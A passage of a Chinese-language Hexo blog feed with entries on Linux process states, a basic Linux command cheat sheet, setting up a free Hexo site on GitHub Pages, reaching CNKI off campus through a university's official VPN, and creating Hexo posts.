int型数。它被存放在各自的进程描述符中。</p><h2 id="进程状态"><a class="markdownIt-Anchor" href="#进程状态"></a> 进程状态</h2><p>进程描述符中的 state域描述了进程的当前状态，该域的值：</p><table><thead><tr><th>状态标志（域值）</th><th>说明</th></tr></thead><tbody><tr><td>TASK_RUNNING</td><td><strong>运行</strong>，表示进程是可执行的；它或者正在执行，或者在运行队列中等待执行</td></tr><tr><td>TASK_INTERRUPTIBLE</td><td><strong>可中断</strong>，进程被阻塞，等待某些条件达成，一旦条件满足，进程就被唤醒，切换为运行状态</td></tr><tr><td>TASK_UNINTERRUPTIBLE</td><td><strong>不可中断</strong>，进程不会因为接收到信号而被唤醒切换为运行</td></tr><tr><td>TASK_ZOMBIE</td><td><strong>僵死</strong>，该进程已经结束了，但其父进程还没有释放其所获得的资源</td></tr><tr><td>TASK_STOPPED</td><td><strong>停止</strong>，进程没有投入运行，也不能投入运行</td></tr></tbody></table><p><img src="/2022/03/19/task-struct/image-20220306160507272.png" alt="image-20220306160507272"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;阅前提示：本文来自《LINUX内核设计与实现》第三章内容总结，如有不足和错误，请在评论区告诉我&lt;/p&gt;
&lt;h1 id=&quot;task_struct结构体&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#task_struct结构体&quot;&gt;&lt;/a&gt; task</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="task_struct" scheme="https://www.rgzzplus.com/tags/task-struct/"/>
    
  </entry>
  
  <entry>
    <title>免费建站</title>
    <link href="https://www.rgzzplus.com/2022/03/17/%E5%85%8D%E8%B4%B9%E5%BB%BA%E7%AB%99/"/>
    <id>https://www.rgzzplus.com/2022/03/17/%E5%85%8D%E8%B4%B9%E5%BB%BA%E7%AB%99/</id>
    <published>2022-03-17T12:48:04.000Z</published>
    <updated>2022-03-18T01:47:56.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="免费建站"><a class="markdownIt-Anchor" href="#免费建站"></a> 免费建站</h1><h2 id="注册-github-账号并创建仓库"><a class="markdownIt-Anchor" href="#注册-github-账号并创建仓库"></a> 注册 Github 账号，并创建仓库</h2><h3 id="创建仓库仓库名格式账户名githubio"><a class="markdownIt-Anchor" href="#创建仓库仓库名格式账户名githubio"></a> 创建仓库(仓库名格式：<a href="http://xn--eqr924acs7a.github.io">账户名.github.io</a>)</h3><p><a href="https://blog.csdn.net/weixin_43729943/article/details/103915046">https://blog.csdn.net/weixin_43729943/article/details/103915046</a></p><h3 id="添加ssh"><a class="markdownIt-Anchor" href="#添加ssh"></a> 添加ssh</h3><p><a href="https://blog.csdn.net/u013778905/article/details/83501204">https://blog.csdn.net/u013778905/article/details/83501204</a></p><h2 id="本地nodejsgit环境搭建"><a class="markdownIt-Anchor" href="#本地nodejsgit环境搭建"></a> 本地nodejs，Git环境搭建</h2><h3 id="教程"><a class="markdownIt-Anchor" href="#教程"></a> 教程</h3><p><a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/zhun-bei-gong-ju">https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/zhun-bei-gong-ju</a></p><h2 id="利用hexo搭建博客"><a class="markdownIt-Anchor" href="#利用hexo搭建博客"></a> 利用hexo搭建博客</h2><h3 id="教程-2"><a class="markdownIt-Anchor" href="#教程-2"></a> 教程</h3><p><a href="https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-an-zhuang-hexo-bo-ke">https://hexoscript.gitbook.io/hexo-script/v/1.3-1/shi-yong-bu-zhou/yi-jian-an-zhuang-hexo-bo-ke</a></p><h3 id="官方文档"><a class="markdownIt-Anchor" href="#官方文档"></a> 官方文档</h3><p><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></p><h2 id="主题"><a class="markdownIt-Anchor" href="#主题"></a> 主题</h2><h3 id="挑选主题"><a class="markdownIt-Anchor" href="#挑选主题"></a> 挑选主题</h3><p><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h3 id="配置主题"><a class="markdownIt-Anchor" href="#配置主题"></a> 配置主题</h3><p>自行阅读主题文件夹下的 README.md文件</p><h2 id="百度收录"><a class="markdownIt-Anchor" href="#百度收录"></a> 百度收录</h2><p><a href="https://zhuanlan.zhihu.com/p/100922816">https://zhuanlan.zhihu.com/p/100922816</a></p><h1 id="最后"><a class="markdownIt-Anchor" href="#最后"></a> 最后</h1><p>在此附上B站大佬的建站视频教程：<a href="https://www.bilibili.com/video/BV1mU4y1j72n">https://www.bilibili.com/video/BV1mU4y1j72n</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;免费建站&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#免费建站&quot;&gt;&lt;/a&gt; 免费建站&lt;/h1&gt;
&lt;h2 id=&quot;注册-github-账号并创建仓库&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#注册-git</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="hexo" scheme="https://www.rgzzplus.com/tags/hexo/"/>
    
    <category term="建站" scheme="https://www.rgzzplus.com/tags/%E5%BB%BA%E7%AB%99/"/>
    
  </entry>
  
  <entry>
    <title>linux指令</title>
    <link href="https://www.rgzzplus.com/2022/03/15/linux%E6%8C%87%E4%BB%A4/"/>
    <id>https://www.rgzzplus.com/2022/03/15/linux%E6%8C%87%E4%BB%A4/</id>
    <published>2022-03-15T10:02:50.000Z</published>
    <updated>2022-04-10T06:42:14.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="linux-命令"><a class="markdownIt-Anchor" href="#linux-命令"></a> Linux 命令</h3><table><thead><tr><th>名字</th><th>语法</th><th>用法</th><th>全称或备注</th></tr></thead><tbody><tr><td>.</td><td></td><td>当前目录</td><td></td></tr><tr><td>…</td><td></td><td>上级目录</td><td></td></tr><tr><td>~</td><td></td><td>用户主目录</td><td>普通用户的主目录为/home；<br>超级用户的主目录为/root</td></tr><tr><td>-</td><td></td><td>前一个工作目录</td><td></td></tr><tr><td>/</td><td></td><td>表示根目录</td><td></td></tr><tr><td>cd</td><td>cd [相对路径或绝对路径]</td><td>切换到目标工作目录</td><td>change directory</td></tr><tr><td>pwd</td><td>pwd</td><td>查看或打印当前目录</td><td>print working directory</td></tr><tr><td>type</td><td>type [命令名]</td><td>用来显示指定命令类型</td><td></td></tr><tr><td>ls</td><td>ls</td><td>显示当前目录下的文件</td><td></td></tr><tr><td>ll</td><td>ll</td><td>显示当前目录下文件详细信息</td><td>ls -l --color=auto</td></tr><tr><td>ll -a</td><td>ll -a</td><td>显示当前目录下文件及隐藏文件详细信息</td><td></td></tr><tr><td>mkdir</td><td>mkdir -p a/b/c/d/e/f 会自动创建文件父目录<br>mkdir -p lucky/{1234}ls 一次可以创建多个子目录</td><td>创建文件目录</td><td>make directory</td></tr><tr><td>rm</td><td>rm -rf [目录名]</td><td>删除文件夹，强制删除</td><td>remove</td></tr><tr><td>rmdir</td><td>rmdir [目录名]</td><td>删除文件目录，要求该文件夹是空文件夹</td><td>remove directory</td></tr><tr><td></td><td></td><td></td><td></td></tr><tr><td>cp</td><td>cp [选项] 源路径 存放路径<br>cp 源路径 存放路径</td><td>拷贝文件到文件夹，复制</td><td>copy</td></tr><tr><td>*</td><td>shiren*</td><td>所有以’shiren’开头的文件夹</td><td></td></tr><tr><td>mv</td><td>mv 源路径 存放路径</td><td>1、移动文件到文件夹，剪切<br>2、修改文件名字</td><td>move</td></tr><tr><td>touch</td><td>touch 文件名</td><td>如果没有该文件，则创建新文件；如果有该文件，则修改该文件的三个时间</td><td></td></tr><tr><td>stat</td><td></td><td>文件属性</td><td>state</td></tr><tr><td>cat</td><td>cat 文件名</td><td>正序查看文件内容</td><td></td></tr><tr><td>tac</td><td>tac 文件名</td><td>倒序查看文件内容</td><td></td></tr><tr><td>more</td><td>more 文件名</td><td>分页查看文件内容</td><td>敲回车，一行行显示后续内容；敲 ‘b’ 返回上一行；敲空格，一页页显示后续内容；敲 ‘h’ 显示帮助，更多指令</td></tr><tr><td>less</td><td>less 文件名</td><td>与more功能基本一样，区别是less的操作命令更多</td><td></td></tr><tr><td>head</td><td>head -10 文件名</td><td>查看文件前10行</td><td></td></tr><tr><td>tail</td><td>tail -10 文件名<br>tail -f 文件名<br>tail -F文件名</td><td>查看文件后10行<br>监控文件变化，按Inode查找<br>监控文件变化，按文件名查找</td><td></td></tr><tr><td>| 竖杠</td><td>head -8 文件名 | tail -1</td><td>‘|’ 将前面查询结果传递给后面，只查询第8行</td><td></td></tr><tr><td>find</td><td>find / -name 文件名</td><td>在 / 内查找叫[文件名]的文件</td><td></td></tr><tr><td>echo</td><td></td><td></td><td></td></tr><tr><td>ln</td><td>ln -s 目标文件名 链接文件名 |创建软链接，类似指针<br>ln 目标文件名 链接文件名 |创建硬链接，类似取别名</td><td>创建文件链接</td><td></td></tr><tr><td>ip addr</td><td>ip addr</td><td>ip查询</td><td></td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="终端相关"><a class="markdownIt-Anchor" href="#终端相关"></a> 终端相关</h4><ul><li>快捷键 <strong>Ctrl+Alt+T</strong>：桌面打开终端</li><li><strong>exit</strong> 或 快捷键 <strong>Ctrl+D</strong>：结束终端会话</li></ul><h4 id="时间相关"><a class="markdownIt-Anchor" href="#时间相关"></a> 时间相关</h4><ul><li><strong>date</strong>：显示当前时间和日期</li><li><strong>cal</strong>：默认显示当前月份的日历</li></ul><h4 id="磁盘相关"><a class="markdownIt-Anchor" href="#磁盘相关"></a> 磁盘相关</h4><ul><li><strong>df</strong>：查看磁盘的当前可用空间</li><li><strong>free</strong>：查看内存容量</li></ul><h4 id="文件相关"><a class="markdownIt-Anchor" href="#文件相关"></a> 文件相关</h4><ul><li><strong>pwd</strong>：输出当前的工作目录名称，【print working directory】</li><li><strong>ls</strong>：列出目录内容</li><li><strong>cd</strong>：修改目录</li></ul><h4 id="tips"><a class="markdownIt-Anchor" href="#tips"></a> tips：</h4><p>焦点跟随鼠标<br>$代表普通用户；#代表超级用户</p><h3 id="linux命令-ll信息详解"><a class="markdownIt-Anchor" href="#linux命令-ll信息详解"></a> linux命令 ll信息详解</h3><p><a href="https://blog.csdn.net/dshf_1/article/details/99973236">参考文章</a></p><p><img src="/2022/03/15/linux%E6%8C%87%E4%BB%A4/image-20220106143643107.png" alt="image-20220106143643107"></p><p>第一列：文件类型</p><p>‘-’ 普通文件</p><p>‘d’ 文件夹、目录</p><p>‘l’ 链接文件，类似于windows的快捷方式</p><p>‘p’ 管理文件</p><p>‘b’ 块设备文件</p><p>‘c’ 字符设备文件</p><p>‘s’ 套接字文件</p><p>后列：文件属性</p><p>r（Read，读取权限）：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目录的权限。<br>w（Write，写入权限）：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。<br>x（execute，执行权限）：对文件而言，具有执行文件的权限；对目录来说，该用户具有进入目录的权限。<br>另外，这里还有2个很特殊的属性，平时不怎么常见，这里也顺带解释一下：</p><p>s或S（SUID,Set UID）：可执行的文件搭配这个权限，便能得到特权，任意存取该文件的所有者能使用的全部系统资源。请注意具备SUID权限的文件，黑客经常利用这种权限，以SUID配上root帐号拥有者，无声无息地在系统中开扇后门，供日后进出使用。<br>t或T（Sticky）：/tmp和 /var/tmp目录供所有用户暂时存取文件，亦即每位用户皆拥有完整的权限进入该目录，去浏览、删除和移动文件。<br>综合起来可得，对于back_init文件，其创建者/所有者具有可读可写可执行的权限，其创建者/所有者所在的组的其他用户具有可读可写可执行的权限，其他组的其他用户则具有可读可执行但不可写的权限。</p><h3 id="type详解"><a class="markdownIt-Anchor" href="#type详解"></a> type详解</h3><p><a href="https://zhidao.baidu.com/question/376357416018438444.html?fr=iks&amp;word=Linux+type&amp;ie=gbk&amp;dyTabStr=MCwyLDMsMSw1LDQsNiw3LDgsOQ==">参考文章</a></p><p>一般情况下，type命令被用于判断另外一个命令是否是内置命令，但是它实际上有更多的用法。</p><ol><li><p>判断一个名字当前是否是alias、keyword、function、builtin、file或者什么都不是：</p><p>type ls 的输出是 ls 是 ‘ls --color=auto’ 的别名</p><p>type if 的输出是 if 是 shell 关键字</p><p>type type 的输出是 type 是 shell 内嵌</p><p>type frydsh 的输出是 bash: type: frydsh: 未找到</p></li><li><p>判断一个名字当前是否是alias、keyword、function、builtin、file或者什么都不是的另一种方法（适用于脚本编程）：</p><p>type -t ls 的输出是 alias</p><p>type -t if 的输出是 keyword</p><p>type -t type 的输出是 builtin</p><p>type -t gedit 的输出是 file</p><p>type -t frydsh 没有输出</p></li><li><p>显示一个名字的所有可能：</p><p>type -a kill 的输出是 kill 是 shell 内嵌 和 kill 是 /bin/kill</p><p>type -at kill 的输出是 builtin 和 file</p></li><li><p>查看一个命令的执行路径（如果它是外部命令的话）：</p><p>type -p gedit 的输出是 /usr/bin/gedit</p><p>type -p kill 没有输出（因为kill是内置命令）</p></li><li><p>强制搜索外部命令：</p><p>type -P kill 的输出是 /bin/kill</p></li></ol><h3 id="cp命令相关选项"><a class="markdownIt-Anchor" href="#cp命令相关选项"></a> cp命令相关选项</h3><p><a href="https://zhidao.baidu.com/question/473418058.html?fr=iks&amp;word=Linux+cp&amp;ie=gbk&amp;dyTabStr=MCwyLDMsMSw1LDQsNiw3LDgsOQ==">参考文章</a></p><p>cp命令的各选项含义如下：</p><p>- a 该选项通常在拷贝目录时使用。它保留链接、文件属性，并递归地拷贝目录，其作用等于dpR选项的组合。</p><p>- d 拷贝时保留链接。</p><p>- f 删除已经存在的目标文件而不提示。</p><p>- i 和f选项相反，在覆盖目标文件之前将给出提示要求用户确认。回答y时目标文件将被覆盖，是交互式拷贝。</p><p>- p 此时cp除复制源文件的内容外，还将把其修改时间和访问权限也复制到新文件中。</p><p>- r 若给出的源文件是一目录文件，此时cp将递归复制该目录下所有的子目录和文件。此时目标文件必须为一个目录名。</p><p>- l 不作拷贝，只是链接文件。</p><p>需要说明的是，为防止用户在不经意的情况下用cp命令破坏另一个文件，如用户指定的目标文件名已存在，用cp命令拷贝文件后，这个文件就会被新源文件覆盖，因此，建议用户在使用cp命令拷贝文件时，最好使用i选项。</p><p>例子：<br>Cp -i file1 file2 (将文档 file1 复制成 file2 . –i为提示确认。)</p><p>cp file1 dir1 将文档 file1 复制到目录 dir1 下，文件名仍为 file1.</p><p>cp /tmp/file1 . 将目录 /tmp 下的文档 file1复制到现行目录下，档名仍为 file1.</p><p>cp /tmp/file1 file2 将目录 /tmp 下的文档 file1现行目录下，档名为file2</p><p>cp -r dir1 dir2 (recursive copy) 复制整个目录.若目录 dir2 不存在，则将目录dir1，及其所有文档和子目录，复制到目录 dir2 下，新目录名称为dir1.若目录dir2不存在，则将dir1，及其所有文档和子目录，复制为目录 dir2.</p><h3 id="stat-文件属性详解"><a class="markdownIt-Anchor" href="#stat-文件属性详解"></a> stat 文件属性详解</h3><p>File：文件名</p><p>Size：大小</p><p>Blocks：块</p><p>IO Block：分配（一般为 4k=4096 ）</p><p>Device：存放在硬盘区位置</p><p>Inode：文件绝对位置</p><p>Links：静态硬连接数量</p><p>Access：文件权限</p><p>Uid：所属用户</p><p>Gid：所属组</p><p>Access：访问文件时间</p><p>Modify：文件内容发生变化时间</p><p>Change：文件权限改变时间</p><h3 id="ln-创建文件详解"><a class="markdownIt-Anchor" href="#ln-创建文件详解"></a> ln 创建文件详解</h3><p><img src="/2022/03/15/linux%E6%8C%87%E4%BB%A4/image-20220107192816485.png" alt="image-20220107192816485"></p><p>ln -s 目标文件名 链接文件名 |创建软链接，形式是 ‘l’ 链接，链接文件 Inode 属性不同，类似于指针<br>ln 目标文件名 链接文件名 |创建硬链接，形式是 ‘-’ 文件，链接文件 Inode 属性相同，类似于别名</p><h3 id="vi-和-vim-编辑器"><a class="markdownIt-Anchor" href="#vi-和-vim-编辑器"></a> VI 和 VIM 编辑器</h3><p><img src="/2022/03/15/linux%E6%8C%87%E4%BB%A4/image-20220107200548033.png" alt="image-20220107200548033"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;linux-命令&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#linux-命令&quot;&gt;&lt;/a&gt; Linux 命令&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;名字&lt;/th&gt;
&lt;th&gt;语法&lt;/th&gt;
&lt;th&gt;用法&lt;/th&gt;
</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://www.rgzzplus.com/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux常用命令" scheme="https://www.rgzzplus.com/tags/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>如何校外访问知网？</title>
    <link href="https://www.rgzzplus.com/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/"/>
    <id>https://www.rgzzplus.com/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/</id>
    <published>2022-03-14T05:08:53.000Z</published>
    <updated>2022-03-15T13:17:23.765Z</updated>
    
    <content type="html"><![CDATA[<h1 id="知网困境"><a class="markdownIt-Anchor" href="#知网困境"></a> 知网困境</h1><p>中国大学生苦知网久矣，众所周知，大学毕业要求要写论文。那么，查资料就是必不可少的一环，而中国知网，下载或阅读一篇论文，收费2元+。一篇还好，关键是，你写论文肯定就不会只参考一篇文章吧，多起来你可能要阅读100+篇才写的下来，那这些费用学生只能勉强负担。</p><p>其实，学校一般都会购买知网的版权，以供学生免费阅读下载知网的论文期刊。下面我先讲讲校园网登录知网吧。</p><h2 id="校园网ip-登录知网"><a class="markdownIt-Anchor" href="#校园网ip-登录知网"></a> 校园网IP 登录知网</h2><p>一般都在知网登录界面，有一个<code>IP登录</code>，如下图所示</p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220314235805697.png" alt="知网IP登录"></p><p>如果你没有连接校园网，就无法使用这里的 <code>IP登录</code>。</p><p>但是，这种方式一般都有一个硬性条件，你必须要能够连接到校园网。由于校园网无法完全覆盖学校，比如我们宿舍就连不上校园网，而且我们用的宽带是电信宽带（一般校园网宽带都很慢），所以就无法使用校园网提供的 IP登录知网。而且写论文的主力军 — <strong>大四</strong>，通常在最后几个学期就在校外实习，很少有时间回学校，更需要访问知网。</p><h2 id="以下为本文重点"><a class="markdownIt-Anchor" href="#以下为本文重点"></a> 以下为本文重点！！</h2><p>所以这个时候就要用到<strong>远程访问技术</strong>来接入到学校内网。一般学校的官网就会提供远程访问的方法，但据我所知，很多学生都不知道。所以接下来我来向大家介绍如何远程访问内网资源（主要是上知网）。</p><h3 id="登录学校官网"><a class="markdownIt-Anchor" href="#登录学校官网"></a> 登录学校官网</h3><ul><li><p>先进入学校官网：<a href="https://www.whpu.edu.cn/">武汉轻工大学</a></p></li><li><p>以学生身份登入<strong>学生管理系统</strong></p></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315190941898.png" alt="学生登录入口图片"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315191410262.png" alt="学生管理系统图片"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315191510293.png" alt="学生登录页面图片"></p><h3 id="找到vpnweb资源"><a class="markdownIt-Anchor" href="#找到vpnweb资源"></a> 找到VPNWeb资源</h3><ul><li>然后往下滑动，在<strong>应用中心</strong>找到<strong>VPNWeb资源</strong>，<strong>进入</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315191711924.png" alt="VPNWeb资源"></p><h3 id="阅读vpn客户端使用说明及下载"><a class="markdownIt-Anchor" href="#阅读vpn客户端使用说明及下载"></a> 阅读VPN客户端使用说明及下载</h3><ul><li>在<strong>VPN客户端使用说明及下载</strong>中一般都会介绍<strong>如何使用VPN客户端</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315192314790.png" alt="VPN客户端使用说明及下载"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315192226012.png" alt="VPN客户端使用说明及下载内容"></p><h3 id="下载vpn客户端"><a class="markdownIt-Anchor" href="#下载vpn客户端"></a> 下载VPN客户端</h3><p>下载<strong>VPN客户端</strong>有两种方式</p><ul><li>第一种方法，直接将<strong>VPN客户端使用说明及下载</strong>翻到文末，有一个<strong>附件</strong>可以<strong>下载</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315192700346.png" alt="vpn客户端"></p><ul><li>第二种方法，返回<strong>信息门户</strong>，找到<strong>VPN客户端下载</strong>，点击跳转后，找到<strong>下载查看</strong>就行</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315193231002.png" alt="vpn客户端下载"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315193457286.png" alt="下载"></p><h3 id="解压到本地并安装"><a class="markdownIt-Anchor" href="#解压到本地并安装"></a> 解压到本地并安装</h3><ul><li>解压压缩包</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315194840841.png" alt="压缩包"></p><ul><li>打开解压位置，找到<strong>EasyConnectInstaller.exe</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195033357.png" alt="EasyConnectInstaller"></p><ul><li><p>双击它，然后你可能跟我一样会弹出<strong>提示</strong>，选择是</p></li><li><p>然后就进行安装过程了</p></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195206191.png" alt="安装完成"></p><h3 id="配置软件"><a class="markdownIt-Anchor" href="#配置软件"></a> 配置软件</h3><ul><li>然后在桌面会找到<strong>EasyConnectInstaller的图标</strong>，双击进入</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195316988.png" alt="EasyConnectInstaller的桌面图标"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195405588.png" alt="EasyConnectInstaller软件界面"></p><ul><li>然后再服务地址内输入：<a href="https://vpn.whpu.edu.cn">https://vpn.whpu.edu.cn</a>，选择<strong>连接</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195523633.png" alt="输入服务地址"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195632932.png" alt="正在初始化"></p><ul><li>等待它下载并安装组件</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195640043.png" alt="下载组件"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195715877.png" alt="安装组件"></p><ul><li>组件安装完成后，就会弹出下图，选择同意</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315195833446.png" alt="组件安装完成"></p><ul><li>然后<strong>单击</strong>图示<strong>图标</strong></li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315200015386.png" alt="软件界面"></p><ul><li>用户名为统一身份认证账号密码，就是你登录<strong>学生管理系统</strong>的账号密码（注：记得勾选记住密码，以便下次访问）</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315200129995.png" alt="软件登录界面"></p><ul><li>登录后在软件主页面找到<strong>中国知网</strong>访问，安全提示<strong>选择是</strong>，就会通过默认浏览器进入知网了</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315201140265.png" alt="登录后软件主页面"></p><h3 id="验证能否免费使用知网"><a class="markdownIt-Anchor" href="#验证能否免费使用知网"></a> 验证能否免费使用知网</h3><ul><li>然后我们在知网页面随便搜索点东西</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315201231953.png" alt="知网主页面"></p><ul><li>跳转后我们可以看到，我们已经<strong>以学校登录</strong>了，现在我们就能随便阅读下载知网论文了</li></ul><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315201353085.png" alt="搜索"></p><p><img src="/2022/03/14/%E6%A0%A1%E5%A4%96%E8%AE%BF%E9%97%AE%E7%99%BB%E5%BD%95%E7%9F%A5%E7%BD%91/image-20220315201620744.png" alt="查看论文内容"></p><h3 id="其它"><a class="markdownIt-Anchor" href="#其它"></a> 其它</h3><p>其它学校也大同小异，只要能在<strong>学生管理系统</strong>中找到<strong>VPN</strong>字样就也能看到教程和软件资源下载。最后，祝大家生活快乐！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;知网困境&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#知网困境&quot;&gt;&lt;/a&gt; 知网困境&lt;/h1&gt;
&lt;p&gt;中国大学生苦知网久矣，众所周知，大学毕业要求要写论文。那么，查资料就是必不可少的一环，而中国知网，下载或阅读一篇论文，收费2元+。一</summary>
      
    
    
    
    <category term="经验交流" scheme="https://www.rgzzplus.com/categories/%E7%BB%8F%E9%AA%8C%E4%BA%A4%E6%B5%81/"/>
    
    
    <category term="中国知网" scheme="https://www.rgzzplus.com/tags/%E4%B8%AD%E5%9B%BD%E7%9F%A5%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>hexo写作</title>
    <link href="https://www.rgzzplus.com/2022/03/13/hexo%E5%86%99%E4%BD%9C/"/>
    <id>https://www.rgzzplus.com/2022/03/13/hexo%E5%86%99%E4%BD%9C/</id>
    <published>2022-03-13T10:09:13.000Z</published>
    <updated>2022-03-13T14:22:08.821Z</updated>
    
    <content type="html"><![CDATA[<h1 id="创建新文章"><a class="markdownIt-Anchor" href="#创建新文章"></a> 创建新文章</h1><p>在命令行中输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><p>如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration">_config.yml</a> 中的 <code>default_layout</code> 参数代替。（默认在博客文件夹下的source文件夹）如果标题包含空格的话，请使用引号括起来。</p><table><thead><tr><th style="text-align:left">参数</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>-p</code>, <code>--path</code></td><td style="text-align:left">自定义新文章的路径</td></tr><tr><td style="text-align:left"><code>-r</code>, <code>--replace</code></td><td style="text-align:left">如果存在同名文章，将其替换</td></tr><tr><td style="text-align:left"><code>-s</code>, <code>--slug</code></td><td style="text-align:left">文章的 Slug，作为新文章的文件名和发布后的 URL</td></tr></tbody></table><h1 id="创建草稿"><a class="markdownIt-Anchor" href="#创建草稿"></a> 创建草稿</h1><p>在命令行中输入：</p><figure 